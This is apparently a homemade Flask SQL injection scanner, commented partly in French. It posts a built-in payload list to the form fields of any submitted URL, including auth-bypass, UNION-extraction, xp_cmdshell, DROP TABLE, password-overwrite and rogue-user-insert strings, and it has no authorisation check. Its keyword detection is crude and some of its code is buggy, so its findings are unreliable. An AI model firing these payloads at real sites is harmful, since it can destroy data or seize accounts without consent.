import requests
import mysql.connector
import datetime
from flask import Flask, request, jsonify, render_template, session, redirect
from bs4 import BeautifulSoup
from urllib.parse import urlparse
#from flask_session import Session


app = Flask(__name__)

# login_register database
login_register_connection = mysql.connector.connect(
    host="localhost",
    user="root",
    password="",  # Enter the password for the login_register database
    database="login_register"
)

# vulnerability_tracker database
vulnerability_tracker_connection = mysql.connector.connect(
    host="localhost",
    user="root",
    password="",
    database="vulnerability_tracker"
)

# DB Config
app.config['LOGIN_REGISTER_CONNECTION'] = login_register_connection
app.config['VULNERABILITY_TRACKER_CONNECTION'] = vulnerability_tracker_connection

def generate_test_inputs(url, field_name):
    # Crée une liste de tests d'injection SQL
    sql_injection_tests = [
        # In-band SQL Injection (Injection SQL en bande)
        ('In-band SQL Injection', [
            f"{field_name}=' OR '1'='1'--",  # Injection classique pour bypasser l'authentification
            f"{field_name}=' OR '1'='1' --",  # Injection similaire avec un espace avant le commentaire
            f"{field_name}=') OR ('1'='1",  # Injection avec une parenthèse fermante
            f"{field_name}=' OR 1=1 --",  # Injection utilisant une condition toujours vraie
            f"{field_name}=' OR 1=1 /*",  # Injection avec un commentaire multi-ligne
            f"{field_name}=') UNION SELECT 1,2,3 --",  # Union pour récupérer des données
            f"{field_name}=' OR '1'='1' #",  # Injection avec un commentaire dièse
        ]),
        # Error-based SQL Injection (Injection SQL basée sur les erreurs)
        ('Error-based SQL Injection', [
            f"{field_name}=1' AND EXTRACTVALUE(1,CONCAT(0x5c,0x3a,0x3a,0x3a,(SELECT user()),0x3a,0x3a,0x3a))--",  # Provoque une erreur XML avec la concaténation
            f"{field_name}=1' AND (SELECT 1 FROM (SELECT SLEEP(5)))--",  # Provoque un délai de 5 secondes
            f"{field_name}=1' AND UPDATEXML(1,CONCAT(0x3a,(SELECT user()),0x3a),1)--",  # Utilise UPDATEXML pour provoquer une erreur
            f"{field_name}=1' AND XMLDATA(//*[SUBSTRING(user(),1,1)='a'])=1--",  # Vérifie si le premier caractère de l'utilisateur est 'a'
            f"{field_name}=1' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2)x GROUP BY CONCAT(0x28,(SELECT user()),0x29))--",  # Provoque une erreur de groupe
        ]),
        # Union-based SQL Injection (Injection SQL basée sur l'union)
        ('Union-based SQL Injection', [
            f"{field_name}=1' UNION SELECT 1,2,3--",  # Utilise UNION pour récupérer trois colonnes
            f"{field_name}=1' UNION SELECT NULL,NULL,NULL--",  # Utilise UNION pour récupérer des valeurs nulles
            f"{field_name}=1' UNION SELECT 'a','b','c'--",  # Utilise UNION pour récupérer des valeurs littérales
            f"{field_name}=1' UNION SELECT user(),database(),version()--",  # Utilise UNION pour récupérer des informations système
            f"{field_name}=1' UNION SELECT table_name,column_name FROM information_schema.columns--",  # Utilise UNION pour récupérer les colonnes des tables
        ]),
        # Boolean-based SQL Injection (Injection SQL basée sur les booléens)
        ('Boolean-based SQL Injection', [
            f"{field_name}=1' AND '1'='1",  # Condition toujours vraie
            f"{field_name}=1' AND '1'='2",  # Condition toujours fausse
            f"{field_name}=1' AND (SELECT 'a'='a')--",  # Vérifie une condition vraie
            f"{field_name}=1' AND (SELECT SUBSTR(user(),1,1)='a')--",  # Vérifie si le premier caractère de l'utilisateur est 'a'
            f"{field_name}=1' AND (SELECT 'a' LIKE 'a')--",  # Vérifie une correspondance de motif
        ]),
        # Out-of-band SQL Injection (Injection SQL hors bande)
        ('Out-of-band SQL Injection', [
            f"{field_name}=1'; SELECT LOAD_FILE('\\\\\\\\{url.replace('http://', '').replace('https://', '')}\\test.php')--",  # Utilise LOAD_FILE pour lire un fichier
            f"{field_name}=1'; SELECT ... INTO OUTFILE '/var/www/html/test.php'--",  # Utilise SELECT INTO OUTFILE pour écrire un fichier
            f"{field_name}=1'; WAITFOR DELAY '0:0:5'--",  # Utilise WAITFOR DELAY pour provoquer un délai
            f"{field_name}=1'; EXEC master.dbo.xp_cmdshell 'ping 192.168.1.1'--",  # Utilise xp_cmdshell pour exécuter une commande système
            f"{field_name}=1'; CREATE DATABASE test; --",  # Utilise CREATE DATABASE pour créer une nouvelle base de données
        ]),
        # Time-based SQL Injection (Injection SQL basée sur le temps)
        ('Time-based SQL Injection', [
            f"{field_name}=1' AND IF(SUBSTR(user(),1,1)='a',SLEEP(5),1)--",  # Utilise IF et SLEEP pour provoquer un délai conditionnel
            f"{field_name}=1' AND IF(ASCII(SUBSTR(user(),1,1))=97,SLEEP(5),1)--",  # Utilise IF et ASCII pour provoquer un délai conditionnel
            f"{field_name}=1' AND SLEEP(5)--",  # Utilise SLEEP pour provoquer un délai
            f"{field_name}=1' AND (SELECT CASE WHEN SUBSTR(user(),1,1)='a' THEN SLEEP(5) ELSE 1 END)--",  # Utilise CASE et SLEEP pour provoquer un délai conditionnel
            f"{field_name}=1' AND BENCHMARK(5000000,MD5('a'))--",  # Utilise BENCHMARK pour provoquer un délai
        ]),
        # Stacked queries SQL Injection (Injection SQL par requêtes empilées)
        ('Stacked queries SQL Injection', [
            f"{field_name}=1'; SELECT * FROM users;--",  # Exécute une sélection de toutes les entrées de la table users
            f"{field_name}=1'; DROP TABLE users;--",  # Supprime la table users
            f"{field_name}=1'; UPDATE users SET password='hacked' WHERE id=1;--",  # Met à jour le mot de passe de l'utilisateur avec l'ID 1
            f"{field_name}=1'; INSERT INTO users (username, password) VALUES ('hacker', 'hacked');--",  # Insère un nouvel utilisateur dans la table users
        ]),
        # Inferential (Blind) SQL Injection (Injection SQL inférentielle aveugle)
        ('Inferential (Blind) SQL Injection', [
            f"{field_name}=1' AND '1'='1--",  # Vérifie une condition toujours vraie
            f"{field_name}=1' AND '1'='2--",  # Vérifie une condition toujours fausse
            f"{field_name}=1' AND SUBSTRING(user(),1,1)='a'--",  # Vérifie si le premier caractère de l'utilisateur est 'a'
            f"{field_name}=1' AND ASCII(SUBSTRING(user(),1,1))=97--",  # Vérifie si le premier caractère ASCII de l'utilisateur est 'a'
        ]),
    ]
    # return
    return sql_injection_tests


def check_sql_injection_response(response, attack_type):
    try:
        if response.status_code != 200:  # Check for unexpected status codes
            return False

        sql_error_keywords = {
            'In-band SQL Injection': [
                'SQL SERVER ERROR',
                'SQLITE ERROR',
                'SYNTAX ERROR',
                'SELECT',
                'INSERT',
                'UPDATE',
                'DELETE',
                'DROP TABLE',
                'CREATE TABLE',
                'UNION',
                '--',
                'HELLO',
                'WELCOME',
                'SQL syntax error',
                'SQL syntax error detected',
                'Invalid SQL syntax',
                'in SQL query',
                'SQL query execution failed',
                'SQL query error',
                'Database error: SQL syntax',
                'Database error: invalid SQL',
                'Database error: query execution failed',
                'Database error: invalid query',
                'SQL error',
                'MySQL error',
                'MySQL server version',
                'MSSQL error',
                'Oracle error',
                'PostgreSQL error',
                'SQLite error',
                'Unknown column',
                'Column not found',
                'Table not found',
                'Unknown database',
                'Database not found',
                'SQL injection detected',
                'Potential SQL injection',
                'SQL injection attempt',
                'Unauthorized SQL command',
                'Security violation',
                'Access denied for user',
                'Incorrect syntax near',
                'Syntax error',
                'Unclosed quotation mark',
                'Invalid input syntax',
                'Unexpected SQL input',
                'Suspicious SQL behavior',
                'Malformed query',
                'SQL injection detected. Access denied',
                'SQL injection detected. Action taken',
                'SQL injection protection activated',
                'Security Alert: Potential SQL injection threat detected',
                'Warning: Suspicious SQL behavior detected',
                'Welcome',
                'Sign-out',
                'Sign out',
                'Déconnecter',
                'Déconnexion',
                'admin',
            ],
            'Time-based SQL Injection': [
                'sleep(',
                'WAITFOR DELAY',
            ],
            'Boolean-based SQL Injection': [
                'TRUE',
                'FALSE',
                'AND',
                'OR',
                'NOT',
                '1=1',
                '1=0',
                'WAITFOR DELAY',
                'SLEEP',
                'Incorrect credentials',
            ],
            'Error-based SQL Injection': [
                'ERROR',
                'SQL SERVER ERROR',
                'SQLITE ERROR',
                'SYNTAX ERROR',
                'SQL syntax error',
                'Invalid SQL syntax',
                'SQL injection detected',
                'Database error',
                'Invalid query',
                'Unknown column',
                'Column not found',
                'Table not found',
                'Unknown database',
            ],
            'Union-based SQL Injection': [
                'UNION SELECT',
                'UNION ALL SELECT',
                'UNION DISTINCT SELECT',
                'NULL',
                'FROM',
                'DATABASE()',
                'TABLE_NAME',
            ],
            'Out-of-band SQL Injection': [
                'LOAD_FILE',
                'INTO OUTFILE',
                'INTO DUMPFILE',
                'XPATH',
                'EXP',
                'DATA_TYPE',
                'BULK INSERT',
            ]
        }

        for keyword in sql_error_keywords.get(attack_type, []):
            if keyword.upper() in response.text.upper():
                return True

        return False
    except Exception as e:
        print("Error checking SQL injection response:", e)
        return False

def extract_form_fields(html_content):
    form_fields = []
    soup = BeautifulSoup(html_content, 'html.parser')
    forms = soup.find_all('form')
    for form in forms:
        inputs = form.find_all('input')
        for input_field in inputs:
            field_name = input_field.get('name')
            if field_name:
                form_fields.append(field_name)
    return form_fields

def extract_website_name(url):
    """Extracts the website name from the URL."""
    parsed_url = urlparse(url)
    subdomain = parsed_url.hostname.split('.')[0]
    domain = parsed_url.hostname.split('.')[1]
    return f"{subdomain}.{domain}"

def perform_sql_injection_tests(url, form_fields):
    vulnerabilities = set()
    test_inputs = generate_test_inputs(url, 'uid')  # Generate test inputs

    for field in form_fields:
        for attack_type, test_inputs_list in test_inputs:
            for test_input in test_inputs_list:
                response = requests.post(url, data={field: test_input})
                # Construct request parameters from form data
                form_data = {field: test_input}
                request_params = '&'.join([f"{key}={value}" for key, value in form_data.items()])
                response_content = response.text
                ip_address = request.remote_addr
                timestamp = datetime.datetime.now()

                if check_sql_injection_response(response, attack_type):
                    vulnerability_message = f' {attack_type} vulnerability '
                    vulnerabilities.add((attack_type, vulnerability_message))

        if vulnerabilities:
            break

    if vulnerabilities:
        # Extract website name
        website_name = extract_website_name(url)
        # Insert the detected vulnerabilities
        for vulnerability_type, vulnerability_message in vulnerabilities:
            insert_vulnerability_report(website_name, vulnerability_type, url, request_params, response_content, ip_address, timestamp, vulnerability_type)

    return vulnerabilities

def insert_vulnerability_report(website_name, vulnerability_detected, url, request_params, response_content, ip_address, timestamp, attack_type):
    try:
        # access the vulnerability_tracker_connection
        connection = app.config['VULNERABILITY_TRACKER_CONNECTION']
        cursor = connection.cursor()
        # check if the vulnerability was detected during testing
        if vulnerability_detected:
            cursor.execute("INSERT INTO vulnerability_report (website_name, vulnerability_detected, url, request_params, response_content, ip_address, timestamp, attack_type) VALUES (%s, %s, %s, %s, %s, %s, %s, %s)",
                           (website_name, vulnerability_detected, url, request_params, response_content, ip_address, timestamp, attack_type))
            connection.commit()
        cursor.close()
    except Exception as e:
        print("Error inserting into database:", e)


def get_original_field_value(url, field_name):
    try:
        # get request to the URL ++ extract the original field value from the response
        response = requests.get(url)
        html_content = response.text
        soup = BeautifulSoup(html_content, 'html.parser')
        form = soup.find('form')
        if form:
            input_field = form.find('input', {'name': field_name})
            if input_field:
                original_value = input_field.get('value')
                return original_value
    except Exception as e:
        print("Error retrieving original field value:", e)
    return None

# Define routes
@app.route('/vulnerability-trends')
def vulnerability_trends():
    try:
        # Access the vulnerability_tracker_connection from the app configuration
        connection = app.config['VULNERABILITY_TRACKER_CONNECTION']
        cursor = connection.cursor(dictionary=True)
        # Fetch vulnerability trends data with website_name, attack_type, and timestamp
        cursor.execute("SELECT website_name, attack_type, timestamp FROM vulnerability_report")
        vulnerability_data = cursor.fetchall()
        cursor.close()
        return jsonify({"vulnerabilities": vulnerability_data})
    except Exception as e:
        return jsonify({"error": str(e)})


@app.route('/', methods=['GET'])
def home():
    # Check if the user is logged in
    if 'email' in session:
        email = session['email']
        user_name = get_user_name(email)  # Function to retrieve user's full name from database
        return render_template('home.html', user_name=user_name)
    else:
        return render_template('home.html')


def get_user_name(email):
    try:
        # Get connection from app context
        connection = app.config['LOGIN_REGISTER_CONNECTION']
        # Create cursor object
        cursor = connection.cursor()

        # Fetch user's full name from database using email
        cursor.execute("SELECT full_name FROM users WHERE email = %s", (email,))
        user = cursor.fetchone()

        print("User from database:", user)  # Add this line for debugging

        if user:
            return user['full_name']
        else:
            return "Guest"  # Return default if user not found

    except Exception as e:
        # Handle exceptions (log the error for debugging)
        print("An unexpected error occurred:", e)
        return "Guest"  # Return default on error

@app.route('/logout')
def logout():
    return redirect("http://127.0.0.1/login-register-main/login.php")

@app.route('/dashboard')
def dashboard():
    return render_template('dashboard.html')

@app.route('/sql-injection-checker')  
def sql_injection_checker():
    return render_template('sql_injection_checker.html')

@app.route('/check-injection', methods=['POST'])
def check_injection_endpoint():
    try:
        data = request.get_json()
        if not data or 'url' not in data:
            return jsonify({'error': 'Please provide a valid URL in the JSON data'}), 400

        url = data['url']
        response = requests.get(url)
        if response.status_code != 200:
            return jsonify({'error': 'Unable to fetch website content'}), 404
        
        parsed_url = urlparse(url)
        if not parsed_url.scheme or not parsed_url.netloc:
            return jsonify({'error': 'Invalid URL format. Must include protocol (http:// or https://) and domain name'}), 400

        html_content = response.text
        form_fields = extract_form_fields(html_content)
        vulnerabilities = perform_sql_injection_tests(url, form_fields)

        if vulnerabilities:
            website_name = extract_website_name(url)
            vulnerabilities_detected = ", ".join(message for _, message in vulnerabilities)
            return jsonify({'vulnerable': True, 'message': f'Potential vulnerabilities detected on {website_name}: {vulnerabilities_detected}!'}), 200
        else:
            return jsonify({'vulnerable': False, 'message': 'Website appears to be protected against SQL injection attack!'}), 200

    except Exception as e:
        print("Error processing request:", e)
        return jsonify({'error': 'Internal server error'}), 500

    
if __name__ == '__main__':
    app.run(debug=True, port=8000)
